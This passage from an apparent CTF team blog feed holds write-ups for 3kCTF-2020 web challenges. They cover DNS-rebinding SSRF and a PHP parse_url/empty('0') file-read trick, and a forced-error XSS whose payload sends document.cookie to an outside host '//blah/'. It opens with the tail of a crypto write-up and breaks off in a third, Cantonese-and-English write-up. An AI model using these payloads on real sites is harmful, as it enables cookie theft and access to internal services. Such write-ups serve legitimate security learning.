        y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; reduce(_xor, xs)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x0, x1 &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; lhss&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(y, []):
            solns&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(bytes([x0, x1, x2, x3]))
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; solns&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, if we force &lt;code&gt;a_sub == b&#39;\0&#39;*4&lt;/code&gt; and &lt;code&gt;b_sub == b&#39;\1&#39;*4 or b_sub == b&#39;\2&#39;*4&lt;/code&gt;, the right hand side can be precomputed. We are able to solve for $x$ once every 0.2 second.&lt;/p&gt;

&lt;p&gt;At last - we are able to get the flag in 30 seconds locally and around 55 seconds online! :tada:&lt;/p&gt;

&lt;hr&gt;

&lt;h2 id=&#34;credits&#34;&gt;Credits&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Thanks @harrier_lcc who noticed that my &lt;em&gt;lever&lt;/em&gt; did not hurt. Playing Minecraft too much, I misspelt liver.&lt;/li&gt;
&lt;li&gt;Thanks @hellman1908 for pointing that we are able to bruteforce byte by byte instead of bruteforcing columns, since that we can apply &lt;code&gt;MixColumns&lt;/code&gt; inverse.&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>3kCTF-2020 Writeup</title>
      <link>https://b6a.black/posts/2020-07-28-3kctf/</link>
      <pubDate>Tue, 28 Jul 2020 11:36:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-07-28-3kctf/</guid>
      <description>&lt;h2 id=&#34;reporter-web-498-points&#34;&gt;reporter (Web; 498 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;apple&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Author: rekter0&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Reporter is an online markdown reporting tool.
it&#39;s free to use for everyone.
there&#39;s a secret report we need located &lt;a href=&#34;http://reporter.3k.ctf.to/secret_report&#34;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/src&#34;&gt;source&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;walkthrough&#34;&gt;Walkthrough&lt;/h3&gt;

&lt;p&gt;The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the &#39;report&#39;.&lt;/p&gt;

&lt;p&gt;There are 4 buttons on the interface: &lt;code&gt;Edit&lt;/code&gt;, &lt;code&gt;Preview&lt;/code&gt;, &lt;code&gt;Save&lt;/code&gt;, and &lt;code&gt;Deliver&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The first target of the challenge is to access the &lt;code&gt;secret_report&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;curl http://reporter.3k.ctf.to/secret_report
&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;403 Forbidden&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Well, knew that.&lt;/p&gt;

&lt;h4 id=&#34;exploiting-toctou-of-the-domain-checking&#34;&gt;Exploiting TOCTOU of the domain checking&lt;/h4&gt;

&lt;p&gt;Interesting things happen in &lt;a href=&#34;https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/src/backend.php&#34;&gt;backend.php&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;if(@$_POST[&amp;#39;deliver&amp;#39;]){
	$thisDoc=file_get_contents($dir.&amp;#39;/file.html&amp;#39;);
	$images = preg_match_all(&amp;#34;/&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\&amp;#34;(.*?)\&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&amp;#34;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;thisDoc&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;matches&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;foreach&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;($&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;matches&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;key &lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$value)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
		&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;thisDoc &lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;str_replace($value&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data:image&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;png&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;base64&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&amp;#34;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;base64_encode&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fetch_remote_file&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;($&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;thisDoc&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When user click on the &lt;code&gt;deliver&lt;/code&gt; button it will get the saved document, &lt;code&gt;fetch_remote_file&lt;/code&gt; and embed it to the report with &lt;code&gt;base64&lt;/code&gt;. Therefore users can embed images from external image hosting sites such as imgur etc.&lt;/p&gt;

&lt;p&gt;How about embedding the &lt;code&gt;secret_report&lt;/code&gt;? It does not work as it do a long list of checks:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;function fetch_remote_file($url) {
    $config[&amp;#39;disallowed_remote_hosts&amp;#39;] = array(&amp;#39;localhost&amp;#39;);
    $config[&amp;#39;disallowed_remote_addresses&amp;#39;] = array(&amp;#34;0.0.0.0/8&amp;#34;, &amp;#34;10.0.0.0/8&amp;#34;, &amp;#34;100.64.0.0/10&amp;#34;, &amp;#34;127.0.0.0/8&amp;#34;, &amp;#34;169.254.0.0/16&amp;#34;, &amp;#34;172.16.0.0/12&amp;#34;, &amp;#34;192.0.0.0/29&amp;#34;, &amp;#34;192.0.2.0/24&amp;#34;, &amp;#34;192.88.99.0/24&amp;#34;, &amp;#34;192.168.0.0/16&amp;#34;, &amp;#34;198.18.0.0/15&amp;#34;, &amp;#34;198.51.100.0/24&amp;#34;, &amp;#34;203.0.113.0/24&amp;#34;, &amp;#34;224.0.0.0/4&amp;#34;, &amp;#34;240.0.0.0/4&amp;#34;,);

    // ...

    $addresses = get_ip_by_hostname($url_components[&amp;#39;host&amp;#39;]);
    $destination_address = $addresses[0];

    // ... checks if the destination_address is in the disallowed list ...

    $opts = array(&amp;#39;http&amp;#39; =&amp;gt; array(&amp;#39;follow_location&amp;#39; =&amp;gt; 0,));
    $context = stream_context_create($opts);
    return file_get_contents($url, false, $context);
}
function get_ip_by_hostname($hostname) {
    $addresses = @gethostbynamel($hostname);
    if (!$addresses) {
      // ... more attempts to get dns A records ...
    }
    return $addresses;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If we change the DNS record very quickly, which the DNS server return &lt;code&gt;1.1.1.1&lt;/code&gt; at &lt;code&gt;get_ip_by_hostname&lt;/code&gt; when it do the checking, and we return &lt;code&gt;127.0.0.1&lt;/code&gt; at &lt;code&gt;file_get_contents&lt;/code&gt; we can access the &lt;code&gt;localhost&lt;/code&gt; and maybe we can get the &lt;code&gt;secret_report&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Therefore I wrote a &lt;a href=&#34;https://github.com/rinlo/ctf-writeups/blob/master/2020/3kCTF-2020/reporter/dnsrebind.js&#34;&gt;script&lt;/a&gt;&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:dns-rebind&#34;&gt;&lt;a class=&#34;footnote&#34; href=&#34;#fn:dns-rebind&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; to act as a nameserver and give different responses.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ dig +short 4kctf.example.com @8.8.8.8
1.1.1.1
$ dig +short 4kctf.example.com @8.8.8.8
127.0.0.1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;![](http://4kctf.example.com/secret_report/)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The result is a file listing with two files:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;3ac45ca05705d39ed27d7baa8b70ecd560b69902.php
secret2

63b4bacc828939706ea2a84822a4505efa73ee3e.php
not much here&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;3ac45ca05705d39ed27d7baa8b70ecd560b69902.php&lt;/code&gt; is suspicious as it have 50 bytes but only 7 bytes returned from server. Maybe the flag is there.&lt;/p&gt;

&lt;h4 id=&#34;wonders-of-php-empty0--true&#34;&gt;Wonders of PHP: empty(&amp;quot;0&amp;quot;) == true&lt;/h4&gt;

&lt;p&gt;I crafted this payload to read the file and get the flag.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;![](0:/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Back to the &lt;code&gt;backend.php&lt;/code&gt; &lt;code&gt;fetch_remote_file&lt;/code&gt;, besides DNS checking it also &lt;code&gt;parse_url&lt;/code&gt; and checks &lt;code&gt;scheme&lt;/code&gt;, &lt;code&gt;port&lt;/code&gt;, etc.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;function fetch_remote_file($url) {
    // ...
    $url_components = @parse_url($url);
    if (!isset($url_components[&amp;#39;scheme&amp;#39;])) {
        return false;
    }
    if (@($url_components[&amp;#39;port&amp;#39;])) {
        return false;
    }
    if (!$url_components) {
        return false;
    }
    if ((!empty($url_components[&amp;#39;scheme&amp;#39;]) &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; !in_array($url_components[&amp;#39;scheme&amp;#39;], array(&amp;#39;http&amp;#39;, &amp;#39;https&amp;#39;)))) {
        return false;
    }
    if (array_key_exists(&amp;#34;user&amp;#34;, $url_components) || array_key_exists(&amp;#34;pass&amp;#34;, $url_components)) {
        return false;
    }
    // ...
    return file_get_contents($url, false, $context);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;parse_url&lt;/code&gt; will parse as follows&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;array(2) {
  [&amp;#34;scheme&amp;#34;]=&amp;gt;
  string(1) &amp;#34;0&amp;#34;
  [&amp;#34;path&amp;#34;]=&amp;gt;
  string(62) &amp;#34;/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php&amp;#34;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Where the &lt;code&gt;scheme&lt;/code&gt; will return &lt;code&gt;true&lt;/code&gt; for &lt;code&gt;isset&lt;/code&gt; and &lt;code&gt;true&lt;/code&gt; for &lt;code&gt;empty&lt;/code&gt; (&lt;code&gt;empty(&amp;quot;0&amp;quot;) == true&lt;/code&gt;), and for &lt;code&gt;file_get_contents&lt;/code&gt; it will recognize &lt;code&gt;0:&lt;/code&gt; as a folder and &lt;code&gt;0:/../&lt;/code&gt; as current folder.&lt;/p&gt;

&lt;h2 id=&#34;xsser-web-499-points&#34;&gt;xsser (Web; 499 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;challenge&lt;/p&gt;

&lt;p&gt;Author: Dali&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;walkthrough-1&#34;&gt;Walkthrough&lt;/h3&gt;

&lt;p&gt;Source code is provided:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;

{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $name;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $isAdmin;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct($nam)
    {
        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $nam;
        $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isAdmin&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;;
    }
}

&lt;span style=&#34;color:#a6e22e&#34;&gt;ob_start&lt;/span&gt;();
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;]))){
    $use&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;);
    $log&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($use);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location: ?login=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$log&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();

}

$new_name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;new&amp;#39;&lt;/span&gt;];
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($new_name)){


  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;stripos&lt;/span&gt;($new_name, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;script&amp;#39;&lt;/span&gt;))&lt;span style=&#34;color:#75715e&#34;&gt;//no xss :p 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                 { 
                    $new_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;htmlentities&lt;/span&gt;($new_name);
                 }
        $new_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;substr&lt;/span&gt;($new_name, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;h1 style=&amp;#34;text-align:center&amp;#34;&amp;gt;Error! Your msg &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$new_name&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;h1&amp;gt;Contact admin /req.php &amp;lt;/h1&amp;gt;&amp;#39;&lt;/span&gt;;

}
 &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;){
            &lt;span style=&#34;color:#a6e22e&#34;&gt;setcookie&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;session&amp;#34;&lt;/span&gt;, $flag, &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3600&lt;/span&gt;);
        }
$check&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;substr&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;));
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($check&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isAdmin&lt;/span&gt;){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;welcome back admin &amp;#39;&lt;/span&gt;;
}
&lt;span style=&#34;color:#a6e22e&#34;&gt;ob_end_clean&lt;/span&gt;();
&lt;span style=&#34;color:#a6e22e&#34;&gt;show_source&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;From the challenge name it is about XSS. After setting &lt;code&gt;$_GET[&#39;login&#39;]&lt;/code&gt;, you can enter something in &lt;code&gt;$_GET[&#39;new&#39;]&lt;/code&gt;, which is supposed to be reflected on the page for XSS.&lt;/p&gt;

&lt;p&gt;Thanks to &lt;code&gt;ob_start();&lt;/code&gt; and &lt;code&gt;ob_end_clean();&lt;/code&gt;, nothing about the user input are printed in the normal case.&lt;/p&gt;

&lt;p&gt;To address this, we can make the interpreter panic before &lt;code&gt;ob_end_clean();&lt;/code&gt;.  Maybe &lt;code&gt;unserialize&lt;/code&gt; could do so?&lt;/p&gt;

&lt;p&gt;But most of the time &lt;code&gt;unserialize&lt;/code&gt; just returns FALSE when you input some garbage that is &amp;quot;un-unserialize-able&amp;quot; (pun intended)&lt;/p&gt;

&lt;p&gt;Let&#39;s try to unserialize some meaningful junks:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;get_declared_classes&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; $c) {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;O:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($c)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#34;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$c&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;:0:{}&amp;#39;&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It shows &lt;code&gt;Fatal error: Uncaught Error: Invalid serialization data for DateTime object&lt;/code&gt;. So &lt;code&gt;DateTime&lt;/code&gt; should do the trick.&lt;/p&gt;

&lt;p&gt;How about the actual XSS payload? We can&#39;t use &lt;code&gt;&amp;lt;script src=//blah&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For some reason &lt;code&gt;script&amp;lt;script src=//blah&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; could bypass that &lt;code&gt;stripos&lt;/code&gt; but it is too long.&lt;/p&gt;

&lt;p&gt;Later on I found that &lt;code&gt;/req.php&lt;/code&gt; accepts external URLs as well. So we can use some other tricks like &lt;code&gt;window.name&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;name=&amp;#39;location=&amp;#34;//blah/&amp;#34;+document.cookie&amp;#39;;location=&amp;#39;//127.0.0.1/?new=%3Cbody%20onload=eval(name)%3E&amp;amp;login=O:8:%22DateTime%22:0:%7B%7D&amp;#39;;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;remarks&#34;&gt;Remarks&lt;/h3&gt;

&lt;p&gt;At first I tried the payload with iframe but Chrome blocks the &lt;code&gt;Set-Cookie&lt;/code&gt; header due to &amp;quot;third-party cookies preference&amp;quot;.&lt;/p&gt;

&lt;p&gt;Then I tried the payload with form and Chrome blocks the popup as expected. But for some reason the Headless Chrome works.&lt;/p&gt;

&lt;h2 id=&#34;image-uploader-web-498-points&#34;&gt;image uploader (Web; 498 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;ozetta&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;description-1&#34;&gt;Description&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;challenge&lt;/p&gt;

&lt;p&gt;source&lt;/p&gt;

&lt;p&gt;Author: Dali&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;題解-walkthrough&#34;&gt;題解 (Walkthrough)&lt;/h3&gt;

&lt;p&gt;我知你睇唔明廣東話架啦. 今次有翻譯.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;I know you don&#39;t understand Cantonese. This time got translation.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;個 description 得兩條&lt;a href=&#34;https://www.google.com/search?q=goodsmile+5678&#34;&gt;奸笑5678&lt;/a&gt;. 是但啦有醬油有計傾.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;(Some unimportant gibberish)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;一開 &lt;code&gt;index.php&lt;/code&gt; 就見到 &lt;code&gt;include(&#39;old.php&#39;);//todo remove this useless file :\&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;After opening &lt;code&gt;index.php&lt;/code&gt; then we can see that include stuff...&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;明眼人一睇就知係伏啦. 一睇兩個 Class 重唔係玩 unserialize.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Obviously it is the vulnerable point. It contains 2 classes so obviously it is about unserialize.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;碌落 D (唔好譯啦你譯唔到個 D 架啦) 個 index.php 見到 file_get_contents. 條件反射 phar unserialize&lt;/p&gt;

&lt;blockquote&gt;
